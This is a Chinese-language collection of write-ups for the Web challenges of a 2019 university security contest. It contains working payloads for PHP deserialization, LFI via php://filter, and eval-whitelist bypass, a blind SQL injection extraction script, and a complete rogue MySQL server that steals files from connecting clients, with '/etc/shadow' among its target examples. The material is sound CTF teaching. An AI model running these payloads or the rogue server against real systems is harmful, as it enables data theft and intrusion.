# 2019全国大学生信息安全大赛
本题已开通评论，欢迎在页面最下方留言吐槽。<img src="https://cloud.panjunwen.com/alu/呲牙.png" alt="呲牙.png" class="vemoticon-img">
## 题目类型：
|类型|年份|难度|
|:---:|:---:|:---:|
|官方赛事题|2019|中|

## 网上公开WP:
+ https://www.zhaoj.in/read-5417.html
+ https://www.52pojie.cn/thread-936377-1-1.html

## 题目下载：
+ 暂无

## 本站备份WP：
**感谢作者：Glzjin、wu1a、warden、lizhirui**

## Web
**作者：Glzjin**
### 1、JustSoso
----------

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555771284bf45fb5306dbce9cc5a2b51b7e28f239-1024x669.png)

题目

知识点：任意文件读取，PHP 反序列化

步骤：

1、打开靶机，发现是这样一个页面。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/15557714443b02362bcd5bf220079e6bcee5867207-1024x164.png)

2、来看看源码。给了参数和提示，让获取 hint.php 的源码。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/15557714635bd0ceb0416ec9f0b90e749bda0a6c5c-1024x163.png)

3、那么就来获取源码看看吧，访问 `/?file=php://filter/read=convert.base64-encode/resource=hint.php`

![](https://www.zhaoj.in/wp-content/uploads/2019/04/155577166239442308dcf360add6d0101db67a7a51-1024x76.png)

4、BASE64 解码一下，得到 hint.php 的源码。

```
    <?php
    class Handle{
        private $handle;
        public function __wakeup(){
    		foreach(get_object_vars($this) as $k => $v) {
                $this->$k = null;
            }
            echo "Waking up\n";
        }
    	public function __construct($handle) {
            $this->handle = $handle;
        }
    	public function __destruct(){
    		$this->handle->getFlag();
    	}
    }

    class Flag{
        public $file;
        public $token;
        public $token_flag;

        function __construct($file){
    		$this->file = $file;
    		$this->token_flag = $this->token = md5(rand(1,10000));
        }

    	public function getFlag(){
    		$this->token_flag = md5(rand(1,10000));
            if($this->token === $this->token_flag)
    		{
    			if(isset($this->file)){
    				echo @highlight_file($this->file,true);
                }
            }
        }
    }
    ?>
```

5、重复上面的 3~4 步，获取 index.php 的源码。
```
    <html>
    <?php
    error_reporting(0);
    $file = $_GET["file"];
    $payload = $_GET["payload"];
    if(!isset($file)){
    	echo 'Missing parameter'.'<br>';
    }
    if(preg_match("/flag/",$file)){
    	die('hack attacked!!!');
    }
    @include($file);
    if(isset($payload)){
        $url = parse_url($_SERVER['REQUEST_URI']);
        parse_str($url['query'],$query);
        foreach($query as $value){
            if (preg_match("/flag/",$value)) {
        	    die('stop hacking!');
        	    exit();
            }
        }
        $payload = unserialize($payload);
    }else{
       echo "Missing parameters";
    }
    ?>
    <!--Please test index.php?file=xxx.php -->
    <!--Please get the source of hint.php-->
    </html>
```
6、来审计一下源码。

index.php 有 file 和 payload 两个参数，先 include 了 file 所指向的文件，再经过一系列的检测之后 反序列化 payload。

然后 hint.php 有两个类 Handle 和 Flag。 对于 Handle 类，它的魔术方法 Weakup 会清空其自身的成员变量，将其都置为 null。而其析构函数则会调用自身成员变量 handle 的 getFlag 方法。而 Flag 类就有这个 getFlag 方法了，其中会随机一个 md5(1~10000随机数) 的 flag_token，和自身的 token 做比较，相等就去读文件。看起来我们可以用这里来读 flag.php 文件了。

7、把源码拷到本地，来伪造序列化对象。
```
    <?php
    class Handle{
        private $handle;
        public function __wakeup(){
            foreach(get_object_vars($this) as $k => $v) {
                $this->$k = null;
            }
            echo "Waking up\n";
        }
        public function __construct($handle) {
            $this->handle = $handle;
        }
        public function __destruct(){
            $this->handle->getFlag();
        }
    }

    class Flag{
        public $file;
        public $token;
        public $token_flag;

        function __construct($file){
            $this->file = $file;
            $this->token_flag = $this->token = md5(rand(1,10000));
            $this->token = &$this->token_flag;
        }

        public function getFlag(){
            $this->token_flag = md5(rand(1,10000));
            if($this->token === $this->token_flag)
            {
                if(isset($this->file)){
                    echo @highlight_file($this->file,true);
                }
            }
        }
    }


    $flag = new Flag("flag.php");
    $handle = new Handle($flag);
    echo serialize($handle)."\n";
    ?>
```
这里我们加了一行：

`$this->token = &$this->token_flag;`

这样做主要是为了下面 getFlag 那的比较，因为这样的引用变量和他所指向的变量一比较，当然相等了。

后面三行就是要求去读 flag.php 文件，然后序列化对象了。

8、运行一下，生成。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555773182add9a0c46679f8c4457aed8c56261396-1024x115.png)

9、打上去，注意 Handle 里的 handle 是私有成员变量，所以得特殊处理下，里面的方块那记得换成 %00。还有为了不触发 weak up\[1\]，所以我们得改下 payload,把成员数目改大些。同时为了绕过后面对于 payload 的检测，我们还要再前面加几个 /\[2\]。所以这里就是访问 ///?file=hint.php&payload=O:6:”Handle”:2:{s:14:”%00Handle%00handle”;O:4:”Flag”:3:{s:4:”file”;s:8:”flag.php”;s:5:”token”;s:32:”b77375f945f272a2084c0119c871c13c”;s:10:”token_flag”;R:4;}}

参考资料\[1\]:[https://www.jianshu.com/p/67ef6f662a4d](https://www.jianshu.com/p/67ef6f662a4d)

参考资料\[2\]:[http://pupiles.com/%E8%B0%88%E8%B0%88parse_url.html](http://pupiles.com/%E8%B0%88%E8%B0%88parse_url.html)

10、访问一下。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/155577370459b9c7bfc24ae1c84bdc52405a523660-1024x158.png)

11、Flag 到手~

Flag: flag{d3601d22-3d10-440e-84b5-c9faff815551}

### 全宇宙最简单的SQL
------------

![](https://www.zhaoj.in/wp-content/uploads/2019/04/155577386858fc1ffaddd7a23668307be4f8670af0-1024x570.png)

题目

知识点：布尔型盲注，Waf Bypass，MySQL 客户端任意文件读取

1、打开靶机。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555774013ba8bfa2d9fa1b74cfb3f8a863144b801-1024x252.png)

2、然后测试提交，抓包看看。

[![](https://www.zhaoj.in/wp-content/uploads/2019/04/15557740662198f4f348e88dfd57a99aa013ba1ebe-1024x613.png)](blob:https://www.zhaoj.in/dd989588-efaf-4320-84ea-4cf357ce3315)

3、放到 postman 里试试。

[![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555774294e2b75176469d1773629a98cd14b653d5-1024x675.png)](https://www.zhaoj.in/wp-content/uploads/2019/04/1555774294e2b75176469d1773629a98cd14b653d5.png)

4、不断 fuzz。主要观察到以下几个现象。

*   username 有注入点。
*   过滤了 or。
*   当最终拼接语句无错误时无论结果如何均为 登录失败。
*   当最终语句有错时返回为 数据库操作失败。

5、根据这两个返回，就可以判断其为 布尔型盲注 了。

6、综上，测试 payload 如下。

username = admin’ union select cot(1 and left(database(),1)>’a’);#

当 left(database(),1)>’a’) 也就是条件为真时，1 and left(database(),1)>’a’ 整个表达式大于 0，没有错误爆出。

当条件为假时，1 and left(database(),1)>’a’ 等于 0，有错误爆出。

上面所说有语句正确执行与否时返回不同，就可以这样区分了。

7、从这儿 [http://zzqsmile.top/2018/06/04/python3/2018-06-04-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/](http://zzqsmile.top/2018/06/04/python3/2018-06-04-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/) 找了个小脚本，把我们的 payload 放进去，修改一下返回判断条件。

同时注意 or 被过滤了，所以 information_schema 也传不上去了。这里就得自己猜猜表名了。
```
    #!/usr/bin/env python3
    # -*- coding: utf-8 -*-

    import requests


    def main():
        get_all_databases("http://39.97.167.120:52105/")


    def http_get(url, payload):
        result = requests.post(url, data={'username': 'admin' + payload, 'password': '123456'})
        result.encoding = 'utf-8'
        if result.text.find('数据库操作失败') == -1:
            return True
        else:
            return False


    # 获取数据库
    def get_all_databases(url):
        db_nums_payload = "select count(*) from users"
        db_numbers = half(url, db_nums_payload)
        print("长度为：%d" % db_numbers)


    # 二分法函数
    def half(url, payload):
        low = 0
        high = 126
        # print(standard_html)
        while low <= high:
            mid = (low + high) / 2
            mid_num_payload = "' union select cot(1 and (%s) > %d);#" % (payload, mid)
            # print(mid_num_payload)
            # print(mid_html)
            if http_get(url, mid_num_payload):
                low = mid + 1
            else:
                high = mid - 1
        mid_num = int((low + high + 1) / 2)
        return mid_num


    if __name__ == '__main__':
        main()
```

8、不断 fuzz，当 长度不为 0 时就是找到表了。

[![](https://www.zhaoj.in/wp-content/uploads/2019/04/155577545209ac8a24e2057945a3fd23926819caab-1024x486.png)](https://www.zhaoj.in/wp-content/uploads/2019/04/155577545209ac8a24e2057945a3fd23926819caab.png)

0，没找到或没数据

[![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555775487f4d3e0156c75efb90d18855acddc795b-1024x626.png)](https://www.zhaoj.in/wp-content/uploads/2019/04/1555775487f4d3e0156c75efb90d18855acddc795b.png)

1，找到了

9、找到表名为 user，知道表名，不知道列名，那就改下函数，如下面这样整，给表设别名。
```
    # 获取数据库
    def get_all_databases(url):
        db_nums_payload = "select length(group_concat(a.1)) from (select 1, 2 union select * from user)a"
        db_numbers = half(url, db_nums_payload)
        print("长度为：%d" % db_numbers)

        db_payload = "select group_concat(a.1) from (select 1, 2 union select * from user)a"
        db_name = ""
        for y in range(1, db_numbers + 1):
            db_name_payload = "ascii(substr((" + db_payload + "),%d,1))" % (
                y)
            db_name += chr(half(url, db_name_payload))

        print("值：" + db_name)
```
![](https://www.zhaoj.in/wp-content/uploads/2019/04/15557758642ae55ba830733a953be12d6503b92dd1-1024x392.png)

第一列是用户名。

参看资料：[http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/#1-10-1-%E5%88%AB%E5%90%8D](http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/#1-10-1-%E5%88%AB%E5%90%8D)

10、再来第二列试试。
```
    # 获取数据库
    def get_all_databases(url):
        db_nums_payload = "select length(group_concat(a.2)) from (select 1, 2 union select * from user)a"
        db_numbers = half(url, db_nums_payload)
        print("长度为：%d" % db_numbers)

        db_payload = "select group_concat(a.2) from (select 1, 2 union select * from user)a"
        db_name = ""
        for y in range(1, db_numbers + 1):
            db_name_payload = "ascii(substr((" + db_payload + "),%d,1))" % (
                y)
            db_name += chr(half(url, db_name_payload))

        print("值：" + db_name)
```
第二列就是密码了。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555775939b3fb89ba7ca458662560e7d74d261124-1024x413.png)

似乎还提示我们 flag 在 /fll1llag_h3r3。

11、先用这组用户名密码登录看看，看到可以登录成功。

[![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555776020ee459fa67678ae8c83bfe8a7b9f93c6d-1024x346.png)](https://www.zhaoj.in/wp-content/uploads/2019/04/1555776020ee459fa67678ae8c83bfe8a7b9f93c6d.png)

12、很熟悉的页面，祭出我们的祖传恶意 MySQL 服务器吧。改好要读取的文件，在自己的服务器上运行。
```
    #!/usr/bin/env python
    #coding: utf8


    import socket
    import asyncore
    import asynchat
    import struct
    import random
    import logging
    import logging.handlers



    PORT = 3306

    log = logging.getLogger(__name__)

    log.setLevel(logging.DEBUG)
    # tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
    tmp_format = logging.StreamHandler()
    tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
    log.addHandler(
        tmp_format
    )

    filelist = (
    #    r'c:\boot.ini',
    #    r'c:\windows\win.ini',
    #    r'c:\windows\system32\drivers\etc\hosts',
        '/fll1llag_h3r3',
    #    '/etc/shadow',
    )


    #================================================
    #=======No need to change after this lines=======
    #================================================

    __author__ = 'Gifts'

    def daemonize():
        import os, warnings
        if os.name != 'posix':
            warnings.warn('Cant create daemon on non-posix system')
            return

        if os.fork(): os._exit(0)
        os.setsid()
        if os.fork(): os._exit(0)
        os.umask(0o022)
        null=os.open('/dev/null', os.O_RDWR)
        for i in xrange(3):
            try:
                os.dup2(null, i)
            except OSError as e:
                if e.errno != 9: raise
        os.close(null)


    class LastPacket(Exception):
        pass


    class OutOfOrder(Exception):
        pass


    class mysql_packet(object):
        packet_header = struct.Struct('<Hbb')
        packet_header_long = struct.Struct('<Hbbb')
        def __init__(self, packet_type, payload):
            if isinstance(packet_type, mysql_packet):
                self.packet_num = packet_type.packet_num + 1
            else:
                self.packet_num = packet_type
            self.payload = payload

        def __str__(self):
            payload_len = len(self.payload)
            if payload_len < 65536:
                header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
            else:
                header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)

            result = "{0}{1}".format(
                header,
                self.payload
            )
            return result

        def __repr__(self):
            return repr(str(self))

        @staticmethod
        def parse(raw_data):
            packet_num = ord(raw_data[0])
            payload = raw_data[1:]

            return mysql_packet(packet_num, payload)


    class http_request_handler(asynchat.async_chat):

        def __init__(self, addr):
            asynchat.async_chat.__init__(self, sock=addr[0])
            self.addr = addr[1]
            self.ibuffer = []
            self.set_terminator(3)
            self.state = 'LEN'
            self.sub_state = 'Auth'
            self.logined = False
            self.push(
                mysql_packet(
                    0,
                    "".join((
                        '\x0a',  # Protocol
                        '5.6.28-0ubuntu0.14.04.1' + '\0',
                        '\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00',
                    ))            )
            )

            self.order = 1
            self.states = ['LOGIN', 'CAPS', 'ANY']

        def push(self, data):
            log.debug('Pushed: %r', data)
            data = str(data)
            asynchat.async_chat.push(self, data)

        def collect_incoming_data(self, data):
            log.debug('Data recved: %r', data)
            self.ibuffer.append(data)

        def found_terminator(self):
            data = "".join(self.ibuffer)
            self.ibuffer = []

            if self.state == 'LEN':
                len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
                if len_bytes < 65536:
                    self.set_terminator(len_bytes)
                    self.state = 'Data'
                else:
                    self.state = 'MoreLength'
            elif self.state == 'MoreLength':
                if data[0] != '\0':
                    self.push(None)
                    self.close_when_done()
                else:
                    self.state = 'Data'
            elif self.state == 'Data':
                packet = mysql_packet.parse(data)
                try:
                    if self.order != packet.packet_num:
                        raise OutOfOrder()
                    else:
                        # Fix ?
                        self.order = packet.packet_num + 2
                    if packet.packet_num == 0:
                        if packet.payload[0] == '\x03':
                            log.info('Query')

                            filename = random.choice(filelist)
                            PACKET = mysql_packet(
                                packet,
                                '\xFB{0}'.format(filename)
                            )
                            self.set_terminator(3)
                            self.state = 'LEN'
                            self.sub_state = 'File'
                            self.push(PACKET)
                        elif packet.payload[0] == '\x1b':
                            log.info('SelectDB')
                            self.push(mysql_packet(
                                packet,
                                '\xfe\x00\x00\x02\x00'
                            ))
                            raise LastPacket()
                        elif packet.payload[0] in '\x02':
                            self.push(mysql_packet(
                                packet, '\0\0\0\x02\0\0\0'
                            ))
                            raise LastPacket()
                        elif packet.payload == '\x00\x01':
                            self.push(None)
                            self.close_when_done()
                        else:
                            raise ValueError()
                    else:
                        if self.sub_state == 'File':
                            log.info('-- result')
                            log.info('Result: %r', data)

                            if len(data) == 1:
                                self.push(
                                    mysql_packet(packet, '\0\0\0\x02\0\0\0')
                                )
                                raise LastPacket()
                            else:
                                self.set_terminator(3)
                                self.state = 'LEN'
                                self.order = packet.packet_num + 1

                        elif self.sub_state == 'Auth':
                            self.push(mysql_packet(
                                packet, '\0\0\0\x02\0\0\0'
                            ))
                            raise LastPacket()
                        else:
                            log.info('-- else')
                            raise ValueError('Unknown packet')
                except LastPacket:
                    log.info('Last packet')
                    self.state = 'LEN'
                    self.sub_state = None
                    self.order = 0
                    self.set_terminator(3)
                except OutOfOrder:
                    log.warning('Out of order')
                    self.push(None)
                    self.close_when_done()
            else:
                log.error('Unknown state')
                self.push('None')
                self.close_when_done()


    class mysql_listener(asyncore.dispatcher):
        def __init__(self, sock=None):
            asyncore.dispatcher.__init__(self, sock)

            if not sock:
                self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
                self.set_reuse_addr()
                try:
                    self.bind(('', PORT))
                except socket.error:
                    exit()

                self.listen(5)

        def handle_accept(self):
            pair = self.accept()

            if pair is not None:
                log.info('Conn from: %r', pair[1])
                tmp = http_request_handler(pair)

    z = mysql_listener()
    # daemonize()
    asyncore.loop()
```

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555776204798ec202699ea631618b84d62535eb82.png)

13、在页面上填好信息，点提交。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555776257d139b1e5f091c62bc0ed59ff230fbc1a-1024x442.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/04/15557762761b082212a9a145f00753596cffccf7db-1024x375.png)

14、到自个儿的服务器上看看，Flag 文件也读到了。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/155577631609c50652ba48ae392598f14151028d77-1024x593.png)

15、Flag 到手~

Flag：flag{3f4abe8b-aa4a-bb48-c2f9f04d045beade}

### love_math
-----------

![](https://www.zhaoj.in/wp-content/uploads/2019/04/15558579726db85c9e174d72d82a8463d185b7f583-1024x694.png)

题目

知识点：命令注入与条件利用

1、打开靶机。发现似乎是一个计算器。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/15558581732d67112cc31fdcf7d331d335d055e1ba-1024x243.png)

2、提交，抓包看看。

[![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555858298d9a89beeb76e8f0a502e64fce392cd3d-1024x576.png)](https://www.zhaoj.in/wp-content/uploads/2019/04/1555858298d9a89beeb76e8f0a502e64fce392cd3d.png)

3、可以看到直接提交给 calc.php 的，那么我们就访问这个文件看看。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555858379f1e2e177148d82481d30ff53c5f9e177-1024x520.png)

4、源码出来了。
```
    <?php
    error_reporting(0);
    //听说你很喜欢数学，不知道你是否爱它胜过爱flag
    if(!isset($_GET['c'])){
        show_source(__FILE__);
    }else{
        //例子 c=20-1
        $content = $_GET['c'];
        if (strlen($content) >= 80) {
            die("太长了不会算");
        }
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
        foreach ($blacklist as $blackitem) {
            if (preg_match('/' . $blackitem . '/m', $content)) {
                die("请不要输入奇奇怪怪的字符");
            }
        }
        //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
        $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
        preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);
        foreach ($used_funcs[0] as $func) {
            if (!in_array($func, $whitelist)) {
                die("请不要输入奇奇怪怪的函数");
            }
        }
        //帮你算出答案
        eval('echo '.$content.';');
    }
```
5、审计一下源码。

先判断 c 这个参数有没有，有的话就判断长度，小于 80 字节就继续往下走。然后拦截一大堆符号，再判断参数里的文本段是否在函数白名单内，都在的话，就继续执行。

6、来看看他的函数表吧。

[http://www.w3school.com.cn/php/php\_ref\_math.asp](http://www.w3school.com.cn/php/php_ref_math.asp)

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555858915550d89add77ffac6d24e85d87df46770-988x1024.png)

这个特别有意思，[base_convert()](http://www.w3school.com.cn/php/func_math_base_convert.asp) 可以任意进制转换，那么我们就可以把十进制数转换为 36 进制数，这样 a~z 我们就都可以用了。

7、来一个试试。

转换工具：[http://www.atool9.com/hexconvert.php](http://www.atool9.com/hexconvert.php)

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555859131dd2555b0f43c09a6e420f3fa02c54170-1024x609.png)

8、构造 payload 试试。访问 /calc.php?c=base_convert(55490343972,10,36)()

![](https://www.zhaoj.in/wp-content/uploads/2019/04/15558592612922e7b49ec1a01c23ba355990dfe3da-1024x653.png)

9、成了，那继续研究怎么绕过长度限制吧。这里的思路，就是先拿到 \_GET，然后用里面的参数来作为函数的名字（这里要读文件，就是 file\_get_contents 了）和参数（文件路径）了。

10、不断 fuzz，发现如下的 payload 可以。

> /calc.php?abs=flag.php&pow=show\_source&c=$pi=base\_convert(37907361743,10,36)(dechex(1598506324));($$pi){pow}($$pi{abs})

解释一下，相当于先定义一个 pi 变量，值为 base\_convert(37907361743,10,36)(dechex(1598506324)) 的结果，这里两个函数都是白名单里的 可以绕过。而 dexhex 则就是先把 “\_GET” 的十进制表示转换为十六进制表示，然后其作为 base\_convert(37907361743,10,36)() 的参数，而这里 base\_convert(37907361743,10,36)() 就相当于 hex2bin()，把 hex 转换成文本。然后，得到 _GET 以后再后面用 ($$pi){pow}($$pi{abs}) 来调用 pow 参数里存的方法名，abs 参数里存的参数，这里的字段都在白名单，可以正确绕过。

11、打过去。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/155585975362f156fc7466b3e5eb92d5aec6651dd8-1024x470.png)

12、Flag 到手~

Flag：flag{79480116-456e-4a90-86e8-4b4b885354b9}

### RefSpace（未做）
--------------

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555860553747f762c9542723801c79081b10360fb-1024x755.png)

1、打开靶机。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/15558604574dabfc349b4fb1027d4d5aeb1a9a9552-1024x186.png)

2、查看一下源码。似乎开了错误显示。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555860601c3c2e6876feafdc8cf73f407c2a3d652-1024x327.png)

3、随便打着试试，似乎有文件包含。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/15558607725b7fa827d7bba37a78e90c090ae8e7ce-1024x180.png)

4、访问 /?route=php://filter/convert.base64-encode/resource=app/index，能读源码。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/15558608400e4d9aa9c020a1695d1f086bdc007bd1-1024x58.png)

base64 解码下，拿到 index.php 的源码：
```
    <?php
    if (!defined('LFI')) {
        echo "Include me!";
        exit();
    }
    ?>
    <html>

    <head>
        <meta charset="UTF-8">
    </head>

    <body>

        Hi CTFer,<br />
        这是一个非常非常简单的SDK服务，它的任务是给各位大佬<!--鼠-->提供flag<br />
        Powered by Aoisystem<br />
        <!-- error_reporting(E_ALL); -->

    </body>

    </html>
```

5、再来尝试一下其他文件，比如 flag？

/?route=app/flag

![](https://www.zhaoj.in/wp-content/uploads/2019/04/155586119349779eca4884fa361e8d6a56df21e24d-1024x160.png)

flag.php 的源码。
```
    <?php
    if (!defined('LFI')) {
        echo "Include me!";
        exit();
    }
    use interesting\FlagSDK;
    $sdk = new FlagSDK();
    $key = $_GET['key'] ?? false;
    if (!$key) {
        echo "Please provide access key<br \>";
        echo '$_GET["key"];';
        exit();
    }
    $flag = $sdk->verify($key);
    if ($flag) {
        echo $flag;
    } else {
        echo "Wrong Key";
        exit();
    }
    //Do you want to know more about this SDK?
    //we 'accidentally' save a backup.zip for more information
```

6、提示有个 backup.zip，下下来看看，是些提示。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555861323c780b1d8aaeb6c6e12b112f3753df6f0-1024x623.png)

    我们的SDK通过如下SHA1算法验证key是否正确:
```
    public function verify($key)
    {
        if (sha1($key) === $this->getHash()) {
            return "too{young-too-simple}";
        }
        return false;
    }

    如果正确的话，我们的SDK会返回flag。

    PS: 为了节省各位大佬的时间，特注明
    	1.此处函数return值并不是真正的flag，和真正的flag没有关系。
    	2.此处调用的sha1函数为PHP语言内建的hash函数。(http://php.net/manual/zh/function.sha1.php)
    	3.您无须尝试本地解码或本地运行sdk.php，它被预期在指定服务器环境上运行。
    	4.几乎大部分源码内都有一定的hint，如果您是通过扫描目录发现本文件的，您可能还有很长的路要走。
```

7、然后来试试 flag 这里，访问 /?route=app/flag&key\[\]=1，爆出一个 /ctf/sdk.php。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555861516bbeb3b61ab497633d6ae926e98b3b869-1024x226.png)

8、来读取一下 /ctf/sdk.php 源码试试。

/ctf/sdk.php 源码：
```
    <?php ?><?php //CN: 这是一个使用商业代码保护工具加密的PHP文件，你并不需要解密它。EN: Advanced encrypted PHP File, You do not need to decrypt it.<?php
    return sg_load('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